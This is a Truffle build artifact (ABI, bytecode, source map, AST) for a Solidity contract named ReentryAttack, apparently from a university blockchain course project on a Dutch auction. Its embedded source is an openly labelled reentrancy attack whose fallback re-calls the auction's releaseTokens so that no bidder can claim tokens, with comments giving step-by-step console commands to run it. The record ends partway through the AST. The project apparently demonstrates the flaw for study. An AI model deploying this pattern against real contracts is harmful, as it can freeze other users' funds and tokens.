{
  "contractName": "ReentryAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "auctionAddress",
          "type": "address"
        },
        {
          "internalType": "address payable",
          "name": "tokenAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "auction",
      "outputs": [
        {
          "internalType": "contract Auction",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "token",
      "outputs": [
        {
          "internalType": "contract CypherpunkCoin",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "commit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdrawTokens",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"auctionAddress\",\"type\":\"address\"},{\"internalType\":\"address payable\",\"name\":\"tokenAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"auction\",\"outputs\":[{\"internalType\":\"contract Auction\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"commit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token\",\"outputs\":[{\"internalType\":\"contract CypherpunkCoin\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/ReentryAttack.sol\":\"ReentryAttack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/Auction.sol\":{\"keccak256\":\"0x2ddd352fad79b26669e8a304a20f6fbc6bd0a26ab64e5763df183056ea71d77e\",\"urls\":[\"bzz-raw://5906a427bf311497c9c30e3f15f0f582bd8740a30b49745f445b0cd5e36c8e21\",\"dweb:/ipfs/QmPaEB1dU5imTypHbuhAZwGqpspgxsKRmp2ykk8uQeq2se\"]},\"/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/CypherpunkCoin.sol\":{\"keccak256\":\"0x4d11e13c55664e267e696b8ed81a2ee0a6aeb6c3f23aeac36ae2adcffdd0795d\",\"urls\":[\"bzz-raw://35dd4f353d146fe2e9732577f57787c45344f8ede41bdf78350d9b74f8ef4f66\",\"dweb:/ipfs/QmP7rCp9DSajtAJQmVWBhufybJ4HN683E8zyuBFuLtdcPr\"]},\"/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/ReentryAttack.sol\":{\"keccak256\":\"0x25adaa7c80872b20799093660fb73baff992fd59b91fa799f44eeef57b9a6637\",\"urls\":[\"bzz-raw://730812c3a5fc9b41a576134df8ee80908cd0f98225ac5991a09266c928259463\",\"dweb:/ipfs/QmQmDoiuz7vvFuA9wDSLVE8MybwdBWa5Hasf1rSt24519G\"]},\"@openzeppelin/contracts/GSN/Context.sol\":{\"keccak256\":\"0xdb26cbf4d028490f49831a7865c2fe1b28db44b535ca8d343785a3b768aae183\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://840b14ce0315c47d49ba328f1f9fa7654ded1c9e1559e6c5e777a7b2dc28bf0a\",\"dweb:/ipfs/QmTLLabn4wcfGro9LEmUXUN2nwKqZSotXMvjDCLXEnLtZP\"]},\"@openzeppelin/contracts/access/AccessControl.sol\":{\"keccak256\":\"0x92f7900d382761c7faefeaced81c6b4f1aae909ed0551803bfe8f27101956360\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://407c0864143968542e5cf5aa7556916d2cf292b201e3dadb65662e9a3aa24187\",\"dweb:/ipfs/QmSnXzYAUaGLGr7uofRbgQraTJvatbjQLBPhyYiMd18oUJ\"]},\"@openzeppelin/contracts/math/SafeMath.sol\":{\"keccak256\":\"0x9a9cf02622cd7a64261b10534fc3260449da25c98c9e96d1b4ae8110a20e5806\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://2df142592d1dc267d9549049ee3317fa190d2f87eaa565f86ab05ec83f7ab8f5\",\"dweb:/ipfs/QmSkJtcfWo7c42KnL5hho6GFxK6HRNV91XABx1P7xDtfLV\"]},\"@openzeppelin/contracts/token/ERC20/ERC20.sol\":{\"keccak256\":\"0x91e0bd6a6762d2a1700dab0849de8422611355100576c4beef1e80d82a4104a0\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://73bbd77af0a8b07255d2ffa20728bcf13b116007c9ddac5d37046cfabb0e1e02\",\"dweb:/ipfs/QmRgZgWCWCSMTTaok6o4QvWA6MgB4goS8qpb3sN7bAvaZ9\"]},\"@openzeppelin/contracts/token/ERC20/ERC20Burnable.sol\":{\"keccak256\":\"0x657b0d90be17331364211d74359df2a734fac864f6e88c80de7626fa33090ffb\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://09cca25fefa2354a424d55a97930c76b11dc50697ba62c85d7affc27a37e830c\",\"dweb:/ipfs/QmPTQBYXxQDSNmMKqwe4WnM8E7NwnpLnkFLSRH8hZRvrVK\"]},\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x5c26b39d26f7ed489e555d955dcd3e01872972e71fdd1528e93ec164e4f23385\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://efdc632af6960cf865dbc113665ea1f5b90eab75cc40ec062b2f6ae6da582017\",\"dweb:/ipfs/QmfAZFDuG62vxmAN9DnXApv7e7PMzPqi4RkqqZHLMSQiY5\"]},\"@openzeppelin/contracts/utils/Address.sol\":{\"keccak256\":\"0xf5fa8cbdffa5ef8be49b246b5628facc30b71707e78a45d80d93b64eff3fe390\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://774e78a9ff32792cc95db4d2ceaf3a7965bb7f0bea5e6cb7cff182b450d44b37\",\"dweb:/ipfs/QmRRMC4uj7eAcLW7chynA3sNEYULMFazdLwQHKHQPyzAbA\"]},\"@openzeppelin/contracts/utils/EnumerableSet.sol\":{\"keccak256\":\"0xb2a11b236f073662f5a196995863f51c11d006bf7c3de158b316dfa1506c4b79\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://8651649cf0b9efa18c3b01c030276fa320d41adbdc286833417e7f36e357b2f3\",\"dweb:/ipfs/QmafhM2Nd1aP43QVB1eRRZaqRXQKswNfQcWi8U8xjrxCfN\"]}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b506040516104ad3803806104ad8339818101604052604081101561003357600080fd5b810190808051906020019092919080519060200190929190505050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505061038c806101216000396000f3fe60806040526004361061004e5760003560e01c80633c7a3aff146100da5780633ccfd60b146100e45780637d9f6db5146100fb5780638d8f2adb1461013c578063fc0c546a14610153576100d5565b366100d55760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a96f86686040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100bb57600080fd5b505af11580156100cf573d6000803e3d6000fd5b50505050005b600080fd5b6100e2610194565b005b3480156100f057600080fd5b506100f961021f565b005b34801561010757600080fd5b5061011061028a565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561014857600080fd5b506101516102ae565b005b34801561015f57600080fd5b50610168610330565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633c7a3aff670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561020457600080fd5b505af1158015610218573d6000803e3d6000fd5b5050505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610287573d6000803e3d6000fd5b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a96f86686040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561031657600080fd5b505af115801561032a573d6000803e3d6000fd5b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea264697066735822122054233ff8dfc9c60c69b1ae38aad17a1a67dd361b83fa5c8ab8f90038020fe08364736f6c634300060c0033",
  "deployedBytecode": "0x60806040526004361061004e5760003560e01c80633c7a3aff146100da5780633ccfd60b146100e45780637d9f6db5146100fb5780638d8f2adb1461013c578063fc0c546a14610153576100d5565b366100d55760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a96f86686040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100bb57600080fd5b505af11580156100cf573d6000803e3d6000fd5b50505050005b600080fd5b6100e2610194565b005b3480156100f057600080fd5b506100f961021f565b005b34801561010757600080fd5b5061011061028a565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561014857600080fd5b506101516102ae565b005b34801561015f57600080fd5b50610168610330565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633c7a3aff670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561020457600080fd5b505af1158015610218573d6000803e3d6000fd5b5050505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610287573d6000803e3d6000fd5b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a96f86686040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561031657600080fd5b505af115801561032a573d6000803e3d6000fd5b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea264697066735822122054233ff8dfc9c60c69b1ae38aad17a1a67dd361b83fa5c8ab8f90038020fe08364736f6c634300060c0033",
  "immutableReferences": {},
  "sourceMap": "759:914:4:-:0;;;953:201;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1055:14;1037:7;;:33;;;;;;;;;;;;;;;;;;1104:12;1081:5;;:36;;;;;;;;;;;;;;;;;;1136:10;1128:5;;:18;;;;;;;;;;;;;;;;;;953:201;;759:914;;;;;;",
  "deployedSourceMap": "759:914:4:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1639:7;;;;;;;;;;:21;;;:23;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;759:914;;;;;1202:189;;;:::i;:::-;;1482:85;;;;;;;;;;;;;:::i;:::-;;789:22;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;1399:75;;;;;;;;;;;;;:::i;:::-;;818:27;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;1202:189;1246:7;;;;;;;;;;:14;;;1351:19;1246:137;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1202:189::o;1482:85::-;1522:5;;;;;;;;;;;:14;;:37;1537:21;1522:37;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1482:85::o;789:22::-;;;;;;;;;;;;:::o;1399:75::-;1443:7;;;;;;;;;;:21;;;:23;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1399:75::o;818:27::-;;;;;;;;;;;;;:::o",
  "source": "pragma solidity ^0.6.0;\r\n\r\nimport \"./Auction.sol\";\r\nimport \"./CypherpunkCoin.sol\";\r\n\r\n// the trick is try to become the last bidder and exploit releaseTokens as\r\n// it transfer ether to an external agent\r\n\r\n// this reentry attack will work with the auction\r\n// of startPrice = 3000, endingPrice = 2000 and supply = 200 in 5 minutes\r\n// here we attack the method releaseTokens\r\n// the amount of commit is 1 Eth, which makes demand higher than the supply\r\n// and this contract will be the last bidder\r\n// however, when others want to release the tokens, Auction contract\r\n// will have to pay this contract, and call the payable function, which\r\n// call release tokens again and generate errors\r\n// therefore, no one can claim the tokens because of this attack\r\ncontract ReentryAttack {\r\n    Auction public auction;\r\n    CypherpunkCoin public token;\r\n    address payable owner;\r\n\r\n    // we should send the money to the contract before doing the test\r\n    constructor(address auctionAddress, address payable tokenAddress) public {\r\n        auction = Auction(auctionAddress);\r\n        token = CypherpunkCoin(tokenAddress);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    // contract commits to the auction\r\n    function commit() public payable {\r\n        auction.commit.value(\r\n            // auction.startPrice() * 10**12 * auction.tokenSupply()\r\n            1000000000000000000\r\n        )();\r\n    }\r\n\r\n    function withdrawTokens() public {\r\n        auction.releaseTokens();\r\n    }\r\n\r\n    function withdraw() external {\r\n        owner.transfer(address(this).balance);\r\n    }\r\n\r\n    // fallback function\r\n    receive() external payable {\r\n        auction.releaseTokens();\r\n    }\r\n}\r\n\r\n// these lines are instructions to attack\r\n// truffle migrate --reset\r\n// truffle console\r\n// cypherPunk = await CypherpunkCoin.deployed()\r\n// cypherPunk.createAuction(3000,2000,200,5)\r\n// auctionAddress = await cypherPunk.auctionAddress()\r\n// attack = await ReentryAttack.new(auctionAddress,cypherPunk.address)\r\n// cypherPunk.openCurrAuction()\r\n// auction = await Auction.at(auctionAddress)\r\n// auction.commit({value: 100000000000000000, from:accounts[1]}) // send from accounts[1]\r\n// attack.commit({value: 1000000000000000000})\r\n// auction.releaseTokens() --> can not release\r\n",
  "sourcePath": "F:/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/ReentryAttack.sol",
  "ast": {
    "absolutePath": "/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/ReentryAttack.sol",
    "exportedSymbols": {
      "ReentryAttack": [
        1343
      ]
    },
    "id": 1344,
    "license": null,
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1264,
        "literals": [
          "solidity",
          "^",
          "0.6",
          ".0"
        ],
        "nodeType": "PragmaDirective",
        "src": "0:23:4"
      },
      {
        "absolutePath": "/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/Auction.sol",
        "file": "./Auction.sol",
        "id": 1265,
        "nodeType": "ImportDirective",
        "scope": 1344,
        "sourceUnit": 539,
        "src": "27:23:4",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "absolutePath": "/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/CypherpunkCoin.sol",
        "file": "./CypherpunkCoin.sol",
        "id": 1266,
        "nodeType": "ImportDirective",
        "scope": 1344,
        "sourceUnit": 1230,
        "src": "52:30:4",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "contract",
        "documentation": null,
        "fullyImplemented": true,
        "id": 1343,
        "linearizedBaseContracts": [
          1343
        ],
        "name": "ReentryAttack",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "functionSelector": "7d9f6db5",
            "id": 1268,
            "mutability": "mutable",
            "name": "auction",
            "nodeType": "VariableDeclaration",
            "overrides": null,
            "scope": 1343,
            "src": "789:22:4",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_Auction_$538",
              "typeString": "contract Auction"
            },
            "typeName": {
              "contractScope": null,
              "id": 1267,
              "name": "Auction",
              "nodeType": "UserDefinedTypeName",
              "referencedDeclaration": 538,
              "src": "789:7:4",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_Auction_$538",
                "typeString": "contract Auction"
              }
            },
            "value": null,
            "visibility": "public"
          },
          {
            "constant": false,
            "functionSelector": "fc0c546a",
            "id": 1270,
            "mutability": "mutable",
            "name": "token",
            "nodeType": "VariableDeclaration",
            "overrides": null,
            "scope": 1343,
            "src": "818:27:4",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_CypherpunkCoin_$1229",
              "typeString": "contract CypherpunkCoin"
            },
            "typeName": {
              "contractScope": null,
              "id": 1269,
              "name": "CypherpunkCoin",
              "nodeType": "UserDefinedTypeName",
              "referencedDeclaration": 1229,
              "src": "818:14:4",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_CypherpunkCoin_$1229",
                "typeString": "contract CypherpunkCoin"
              }
            },
            "value": null,
            "visibility": "public"
          },
          {
            "constant": false,
            "id": 1272,
            "mutability": "mutable",
            "name": "owner",
            "nodeType": "VariableDeclaration",
            "overrides": null,
            "scope": 1343,
            "src": "852:21:4",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address_payable",
              "typeString": "address payable"
            },
            "typeName": {
              "id": 1271,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "852:15:4",
              "stateMutability": "payable",
              "typeDescriptions": {
                "typeIdentifier": "t_address_payable",
                "typeString": "address payable"
              }
            },
            "value": null,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 1296,
              "nodeType": "Block",
              "src": "1026:128:4",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 1283,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 1279,
                      "name": "auction",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1268,
                      "src": "1037:7:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Auction_$538",
                        "typeString": "contract Auction"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "id": 1281,
                          "name": "auctionAddress",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1274,
                          "src": "1055:14:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 1280,
                        "name": "Auction",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 538,
                        "src": "1047:7:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_Auction_$538_$",
                          "typeString": "type(contract Auction)"
                        }
                      },
                      "id": 1282,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1047:23:4",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Auction_$538",
                        "typeString": "contract Auction"
                      }
                    },
                    "src": "1037:33:4",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Auction_$538",
                      "typeString": "contract Auction"
                    }
                  },
                  "id": 1284,
                  "nodeType": "ExpressionStatement",
                  "src": "1037:33:4"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 1289,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 1285,
                      "name": "token",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1270,
                      "src": "1081:5:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_CypherpunkCoin_$1229",
                        "typeString": "contract CypherpunkCoin"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "id": 1287,
                          "name": "tokenAddress",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1276,
                          "src": "1104:12:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address_payable",
                            "typeString": "address payable"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address_payable",
                            "typeString": "address payable"
                          }
                        ],
                        "id": 1286,
                        "name": "CypherpunkCoin",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1229,
                        "src": "1089:14:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_CypherpunkCoin_$1229_$",
                          "typeString": "type(contract CypherpunkCoin)"
                        }
                      },
                      "id": 1288,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1089:28:4",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_CypherpunkCoin_$1229",
                        "typeString": "contract CypherpunkCoin"
                      }
                    },
                    "src": "1081:36:4",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_CypherpunkCoin_$1229",
                      "typeString": "contract CypherpunkCoin"
                    }
                  },
                  "id": 1290,
                  "nodeType": "ExpressionStatement",
                  "src": "1081:36:4"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 1294,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 1291,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1272,
                      "src": "1128:5:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address_payable",
                        "typeString": "address payable"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "expression": {
                        "argumentTypes": null,
                        "id": 1292,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": -15,
                        "src": "1136:3:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 1293,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "sender",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": null,
                      "src": "1136:10:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address_payable",
                        "typeString": "address payable"
                      }
                    },
                    "src": "1128:18:4",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address_payable",
                      "typeString": "address payable"
                    }
                  },
                  "id": 1295,
                  "nodeType": "ExpressionStatement",
                  "src": "1128:18:4"
                }
              ]
            },
            "documentation": null,
            "id": 1297,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1277,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 1274,
                  "mutability": "mutable",
                  "name": "auctionAddress",
                  "nodeType": "VariableDeclaration",
                  "overrides": null,
                  "scope": 1297,
                  "src": "965:22:4",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 1273,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "965:7:4",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 1276,
                  "mutability": "mutable",
                  "name": "tokenAddress",
                  "nodeType": "VariableDeclaration",
                  "overrides": null,
                  "scope": 1297,
                  "src": "989:28:4",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address_payable",
                    "typeString": "address payable"
                  },
                  "typeName": {
                    "id": 1275,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "989:15:4",
                    "stateMutability": "payable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address_payable",
                      "typeString": "address payable"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "964:54:4"
            },
            "returnParameters": {
              "id": 1278,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1026:0:4"
            },
            "scope": 1343,
            "src": "953:201:4",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 1309,
              "nodeType": "Block",
              "src": "1235:156:4",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "hexValue": "31303030303030303030303030303030303030",
                          "id": 1305,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "1351:19:4",
                          "subdenomination": null,
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1000000000000000000"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          }
                        ],
                        "expression": {
                          "argumentTypes": null,
                          "expression": {
                            "argumentTypes": null,
                            "id": 1300,
                            "name": "auction",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1268,
                            "src": "1246:7:4",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Auction_$538",
                              "typeString": "contract Auction"
                            }
                          },
                          "id": 1303,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "commit",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 249,
                          "src": "1246:14:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_payable$__$returns$__$",
                            "typeString": "function () payable external"
                          }
                        },
                        "id": 1304,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "value",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": null,
                        "src": "1246:20:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_setvalue_pure$_t_uint256_$returns$_t_function_external_payable$__$returns$__$value_$",
                          "typeString": "function (uint256) pure returns (function () payable external)"
                        }
                      },
                      "id": 1306,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1246:135:4",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_payable$__$returns$__$value",
                        "typeString": "function () payable external"
                      }
                    },
                    "id": 1307,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1246:137:4",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1308,
                  "nodeType": "ExpressionStatement",
                  "src": "1246:137:4"
                }
              ]
            },
            "documentation": null,
            "functionSelector": "3c7a3aff",
            "id": 1310,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "commit",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1298,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1217:2:4"
            },
            "returnParameters": {
              "id": 1299,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1235:0:4"
            },
            "scope": 1343,
            "src": "1202:189:4",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 1318,
              "nodeType": "Block",
              "src": "1432:42:4",
              "statements": [
                {
